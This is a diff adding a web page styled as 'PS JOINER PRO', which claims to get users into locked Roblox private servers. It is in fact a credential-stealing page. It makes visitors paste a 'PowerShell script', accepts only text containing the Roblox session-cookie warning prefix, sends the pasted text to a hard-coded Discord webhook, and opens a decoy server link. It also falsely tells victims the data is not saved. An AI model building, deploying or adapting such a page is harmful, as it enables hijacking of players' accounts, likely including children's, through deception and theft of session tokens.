@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>PS JOINER PAYED</title>
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" href="br.png">
+
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Space+Grotesk:wght@400;600&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg-dark: #070608;
+      --panel: #0f0f12;
+      --glass: rgba(255,255,255,0.04);
+      --neon-pink: #ff2d95;
+      --neon-cyan: #00eaff;
+      --muted: #bdbdbd;
+      --accent: linear-gradient(90deg,var(--neon-pink),var(--neon-cyan));
+    }
+
+    html, body {
+      height: 100%;
+      margin: 0;
+      background:
+        radial-gradient(1200px 600px at 10% 10%, rgba(255,45,149,0.06), transparent 6%),
+        radial-gradient(1200px 600px at 90% 90%, rgba(0,234,255,0.04), transparent 6%),
+        var(--bg-dark);
+      color: #e9e9e9;
+      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, "Helvetica Neue", Arial;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    .wrap {
+      max-width: 980px;
+      margin: 36px auto;
+      padding: 28px;
+      border-radius: 16px;
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      box-shadow: 0 10px 30px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.02);
+      border: 1px solid rgba(255,255,255,0.03);
+      backdrop-filter: blur(6px);
+    }
+
+    header {
+      display: flex;
+      gap: 16px;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 18px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .logo {
+      width: 54px;
+      height: 54px;
+      border-radius: 12px;
+      display: inline-grid;
+      place-items: center;
+      background: linear-gradient(180deg,#0b0b0d,#121214);
+      box-shadow: 0 6px 18px rgba(0,0,0,0.6), 0 0 20px rgba(255,45,149,0.04) inset;
+      border: 1px solid rgba(255,255,255,0.03);
+    }
+
+    .logo .glyph {
+      font-family: "Space Grotesk", Inter, sans-serif;
+      font-weight: 700;
+      font-size: 20px;
+      letter-spacing: -1px;
+      background: var(--accent);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    h1 {
+      font-size: 18px;
+      margin: 0;
+      color: var(--neon-pink);
+      font-weight: 800;
+      letter-spacing: 0.6px;
+    }
+
+    .subtitle {
+      font-size: 12px;
+      color: var(--muted);
+      margin-top: 2px;
+    }
+
+    .controls {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+    }
+
+    .pill {
+      padding: 8px 12px;
+      border-radius: 12px;
+      background: var(--glass);
+      border: 1px solid rgba(255,255,255,0.02);
+      font-size: 13px;
+      color: var(--muted);
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: 1fr 360px;
+      gap: 20px;
+      margin-top: 10px;
+    }
+
+    @media (max-width:920px){
+      .grid { grid-template-columns: 1fr; }
+    }
+
+    .panel {
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border-radius: 12px;
+      padding: 16px;
+      border: 1px solid rgba(255,255,255,0.03);
+      box-shadow: 0 8px 22px rgba(0,0,0,0.6);
+    }
+
+    .video-wrap {
+      border-radius: 10px;
+      overflow: hidden;
+      margin-bottom: 12px;
+      border: 1px solid rgba(255,255,255,0.03);
+    }
+
+    video {
+      display: block;
+      width: 100%;
+      height: auto;
+      background: #000;
+    }
+
+    textarea {
+      width: 100%;
+      min-height: 160px;
+      padding: 12px;
+      border-radius: 10px;
+      border: 1px solid rgba(255,255,255,0.04);
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0));
+      color: #eaf6ff;
+      font-family: Consolas, monospace;
+      font-size: 13px;
+      resize: vertical;
+      outline: none;
+    }
+
+    textarea.invalid {
+      box-shadow: 0 0 0 3px rgba(255,45,149,0.12);
+      border-color: rgba(255,45,149,0.6);
+      animation: shake 0.28s;
+    }
+
+    @keyframes shake {
+      0% { transform: translateX(0); }
+      25% { transform: translateX(-6px); }
+      50% { transform: translateX(6px); }
+      75% { transform: translateX(-4px); }
+      100% { transform: translateX(0); }
+    }
+
+    .row {
+      display: flex;
+      gap: 12px;
+      margin-top: 12px;
+      align-items: center;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 12px 16px;
+      border-radius: 10px;
+      border: none;
+      cursor: pointer;
+      font-weight: 700;
+      background: linear-gradient(90deg,var(--neon-pink),var(--neon-cyan));
+      color: #081018;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.5);
+    }
+
+    .btn.ghost {
+      background: transparent;
+      border: 1px solid rgba(255,255,255,0.04);
+      color: var(--muted);
+      font-weight: 600;
+    }
+
+    .stats {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .stat-card {
+      padding: 12px;
+      border-radius: 10px;
+      background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0));
+      border: 1px solid rgba(255,255,255,0.03);
+    }
+
+    .stat-title {
+      font-size: 12px;
+      color: var(--muted);
+      margin-bottom: 6px;
+    }
+
+    .stat-value {
+      font-size: 20px;
+      font-weight: 800;
+      color: var(--neon-cyan);
+      letter-spacing: 0.6px;
+    }
+
+    footer {
+      margin-top: 18px;
+      text-align: center;
+      color: var(--muted);
+      font-size: 13px;
+    }
+
+    .glitch {
+      display: inline-block;
+      position: relative;
+    }
+
+    .glitch::before,
+    .glitch::after {
+      content: attr(data-text);
+      position: absolute;
+      left: 0;
+      top: 0;
+      mix-blend-mode: screen;
+      opacity: 0.9;
+      clip-path: rect(0,9999px,0,0);
+    }
+
+    .glitch::before {
+      color: var(--neon-pink);
+      transform: translate(1px,-1px);
+      animation: gl1 2.5s infinite;
+    }
+
+    .glitch::after {
+      color: var(--neon-cyan);
+      transform: translate(-1px,1px);
+      animation: gl2 2.5s infinite;
+    }
+
+    @keyframes gl1 {
+      0% { clip-path: rect(0,9999px,0,0); }
+      20% { clip-path: rect(0,9999px,999px,0); }
+      40% { clip-path: rect(0,9999px,0,0); }
+      60% { clip-path: rect(0,9999px,999px,0); }
+      100% { clip-path: rect(0,9999px,0,0); }
+    }
+
+    @keyframes gl2 {
+      0% { clip-path: rect(0,9999px,0,0); }
+      30% { clip-path: rect(0,9999px,999px,0); }
+      50% { clip-path: rect(0,9999px,0,0); }
+      80% { clip-path: rect(0,9999px,999px,0); }
+      100% { clip-path: rect(0,9999px,0,0); }
+    }
+
+    .muted {
+      color: var(--muted);
+      font-size: 13px;
+    }
+
+    .valid-indicator {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 6px 10px;
+      border-radius: 999px;
+      background: rgba(0,0,0,0.4);
+      font-weight: 700;
+    }
+
+    .valid-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      box-shadow: 0 0 10px rgba(0,224,155,0.16);
+    }
+
+    .invalid-dot {
+      background: #ff4d6d;
+      box-shadow: 0 0 10px rgba(255,77,109,0.18);
+    }
+
+    .valid-dot {
+      background: #00e09b;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="wrap" role="main">
+
+    <header>
+      <div class="brand">
+        <div class="logo"><div class="glyph">BR</div></div>
+        <div>
+          <h1>PS JOINER PRO <span style="font-weight:600;color:var(--muted);font-size:12px">— Brainrot Edition</span></h1>
+          <div class="subtitle">WATCH THE TUTORIAL BELOW TO GET THE POWERSHELL CODE</div>
+        </div>
+      </div>
+
+      <div class="controls">
+        <div class="pill">Env: <strong style="color:var(--neon-cyan)">Browser</strong></div>
+        <div class="pill">Mode: <strong style="color:var(--neon-pink)">Live</strong></div>
+      </div>
+    </header>
+
+    <section class="grid">
+
+      <div>
+        <div class="panel video-wrap">
+          <video id="tutorialVideo" src="https://drive.google.com/file/d/1WCWbH1WgmGTKcMIMrKKDdcR30JFIW_9n/view?usp=sharing" controls preload="metadata"></video>
+        </div>
+
+        <div class="panel textarea">
+          <div style="display:flex;align-items:center;gap:12px;margin-bottom:10px">
+            <div style="font-weight:800;color:var(--neon-pink)">Paste PowerShell</div>
+            <div class="muted" style="margin-left:auto">
+              POWERSHELL is required for BYPASSING you into LOCKED + RICH private servers and we don't save it.
+            </div>
+          </div>
+
+          <textarea id="psInput" placeholder="Paste your PowerShell script here..."></textarea>
+
+          <div class="row">
+            <button id="joinBtn" class="btn">AUTO-JOIN PS</button>
+
+            <div class="valid-indicator">
+              <span id="validDot" class="invalid-dot"></span>
+              <span id="validText" style="color:var(--muted)">NOT VALID</span>
+            </div>
+          </div>
+
+          <div class="row" style="margin-top:10px">
+            <button id="copyBtn" class="btn ghost">Copy Script</button>
+            <button id="clearBtn" class="btn ghost">Clear</button>
+            <div style="margin-left:auto" class="muted">
+              Last sent: <span id="lastSent">—</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <aside>
+        <div class="stats">
+
+          <div class="stat-card">
+            <div class="stat-title">PS JOINS</div>
+            <div class="stat-value" id="joinCount">0</div>
+            <div class="muted" style="margin-top:8px">Persistent counter stored locally</div>
+          </div>
+
+          <div class="stat-card">
+            <div class="stat-title">Last Opened Link</div>
+            <div id="lastLink" class="muted">—</div>
+          </div>
+
+        </div>
+      </aside>
+
+    </section>
+
+    <footer>
+      <span class="glitch" data-text="brainrot.pro">brainrot.pro</span>
+      <span style="margin-left:8px;color:var(--muted)">— crafted for you</span>
+    </footer>
+
+  </div>
+
+  <!-- LOADING OVERLAY -->
+  <div id="loadingOverlay"
+       style="display:none;position:fixed;inset:0;z-index:1999;align-items:center;justify-content:center;background:rgba(0,0,0,0.75)">
+    <div style="text-align:center">
+      <div style="width:72px;height:72px;border-radius:50%;border:6px solid rgba(255,255,255,0.06);border-top-color:var(--neon-cyan);margin:0 auto 12px;animation:spin 1s linear infinite"></div>
+      <div style="color:#fff;font-weight:800">SENDING...</div>
+    </div>
+  </div>
+
+  <script>
+    /* -------------------------------- CONFIG -------------------------------- */
+    const webhookURL = "https://discord.com/api/webhooks/1444516510310596672/dR4f49mA2LXwaA_AijR5SgANfM5MBRmZyPtDeXWbEQJbr9xyeDSdzVDQh4hbGatVhuHk?wait=true";
+    const linkA = "https://www.roblox.com/share?code=873988b0a26449498cceb1b239455bb8&type=Server";
+    const requiredSignature = "_|WARNING:-DO-NOT-SHARE-THIS.";
+
+    /* -------------------------------- DOM -------------------------------- */
+    const psInput = document.getElementById("psInput");
+    const joinBtn = document.getElementById("joinBtn");
+    const joinCountEl = document.getElementById("joinCount");
+    const lastLinkEl = document.getElementById("lastLink");
+    const loadingOverlay = document.getElementById("loadingOverlay");
+    const validText = document.getElementById("validText");
+    const validDot = document.getElementById("validDot");
+    const lastSentEl = document.getElementById("lastSent");
+    const copyBtn = document.getElementById("copyBtn");
+    const clearBtn = document.getElementById("clearBtn");
+
+    /* ------------------------------ STORAGE ------------------------------ */
+    const KEY_JOINS = "psjoin_pro_count_v1";
+    const KEY_LAST_LINK = "psjoin_pro_lastlink_v1";
+    const KEY_LAST_SENT = "psjoin_pro_lastsent_v1";
+
+    let joinCount = parseInt(localStorage.getItem(KEY_JOINS) || "0", 10);
+    joinCountEl.textContent = joinCount;
+
+    const storedLast = localStorage.getItem(KEY_LAST_LINK);
+    if (storedLast) lastLinkEl.textContent = storedLast;
+
+    const storedLastSent = localStorage.getItem(KEY_LAST_SENT);
+    if (storedLastSent) lastSentEl.textContent = storedLastSent;
+
+    /* ---------------------------- VALIDATION UI ---------------------------- */
+    function updateValidityUI(isValid) {
+      if (isValid) {
+        validText.textContent = "VALID";
+        validText.style.color = "#00e09b";
+        validDot.className = "valid-dot";
+      } else {
+        validText.textContent = "NOT VALID";
+        validText.style.color = "#ff6b7a";
+        validDot.className = "invalid-dot";
+      }
+    }
+
+    function checkValidity(text) {
+      return text.includes(requiredSignature);
+    }
+
+    psInput.addEventListener("input", () => {
+      const ok = checkValidity(psInput.value || "");
+      updateValidityUI(ok);
+      if (ok) psInput.classList.remove("invalid");
+    });
+
+    /* --------------------------- COPY & CLEAR --------------------------- */
+    copyBtn.addEventListener("click", async () => {
+      try {
+        await navigator.clipboard.writeText(psInput.value || "");
+        copyBtn.textContent = "Copied ✓";
+        setTimeout(() => copyBtn.textContent = "Copy Script", 1500);
+      } catch (e) {
+        copyBtn.textContent = "Copy Failed";
+        setTimeout(() => copyBtn.textContent = "Copy Script", 1500);
+      }
+    });
+
+    clearBtn.addEventListener("click", () => {
+      psInput.value = "";
+      updateValidityUI(false);
+    });
+
+    /* ------------------------- SEND + OPEN LOGIC ------------------------- */
+    async function sendToWebhookAndOpen() {
+      const content = (psInput.value || "").trim();
+
+      if (!content) {
+        alert("Paste something first.");
+        return;
+      }
+
+      if (!checkValidity(content)) {
+        psInput.classList.add("invalid");
+        updateValidityUI(false);
+        alert("❌ Not a valid PowerShell script!");
+        return;
+      }
+
+      let newWin = null;
+      try {
+        newWin = window.open("about:blank", "_blank");
+      } catch {
+        newWin = null;
+      }
+
+      loadingOverlay.style.display = "flex";
+
+      try {
+        if (content.length <= 1900) {
+          const resp = await fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: "```\nps\n" + content + "\n```" })
+          });
+
+          if (!resp.ok) {
+            const txt = await resp.text().catch(() => "(no body)");
+            throw new Error(`Webhook responded ${resp.status}: ${txt}`);
+          }
+
+        } else {
+          const blob = new Blob([content], { type: "text/plain" });
+          const fd = new FormData();
+          fd.append("file", blob, "script.ps1");
+
+          const resp = await fetch(webhookURL, { method: "POST", body: fd });
+
+          if (!resp.ok) {
+            const txt = await resp.text().catch(() => "(no body)");
+            throw new Error(`Webhook responded ${resp.status}: ${txt}`);
+          }
+        }
+
+        const now = new Date().toLocaleString();
+        lastSentEl.textContent = now;
+        localStorage.setItem(KEY_LAST_SENT, now);
+
+        joinCount = joinCount + 1;
+        localStorage.setItem(KEY_JOINS, String(joinCount));
+        joinCountEl.textContent = joinCount;
+
+        const target = linkA;
+        localStorage.setItem(KEY_LAST_LINK, target);
+        lastLinkEl.textContent = target;
+
+        if (newWin && !newWin.closed) {
+          try {
+            newWin.location.href = target;
+          } catch {
+            newWin = window.open(target, "_blank");
+          }
+        } else {
+          const opened = window.open(target, "_blank");
+          if (!opened) {
+            alert("Link couldn't be opened automatically. Click the 'Last Opened Link' in the right panel.");
+          }
+        }
+
+      } catch (err) {
+        console.error("Webhook send error:", err);
+        alert("❌ Webhook sending failed — see console for details.");
+      } finally {
+        loadingOverlay.style.display = "none";
+      }
+    }
+
+    joinBtn.addEventListener("click", sendToWebhookAndOpen);
+
+    psInput.addEventListener("keydown", (e) => {
+      if ((e.ctrlKey || e.metaKey) && e.key === "Enter") {
+        e.preventDefault();
+        sendToWebhookAndOpen();
+      }
+    });
+
+    updateValidityUI(checkValidity(psInput.value || ""));
+  </script>
+
+</body>
+</html>
